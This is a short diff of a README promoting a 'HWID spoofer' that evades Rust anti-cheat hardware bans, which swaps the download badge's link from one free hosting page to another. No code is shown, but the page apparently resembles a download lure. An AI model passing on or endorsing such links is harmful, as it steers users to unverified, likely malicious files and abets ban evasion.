@@ -4,7 +4,7 @@ Got hit with a Rust hardware ban? EAC flags stacking up? Getting insta-kicked th
 
 Whether you're rage cheating or just got flagged for no reason, this tool gives you a **fresh start every time**.
 
-[![Download Spoofer](https://img.shields.io/badge/Download-Spoofer-blueviolet)](https://fileoffload1.bitbucket.io)
+[![Download Spoofer](https://img.shields.io/badge/Download-Spoofer-blueviolet)](https://Rust-HWID-Spoofer-gig5.github.io/.github)
 ---
 
 ## 💡 What Is a HWID Spoofer for Rust?
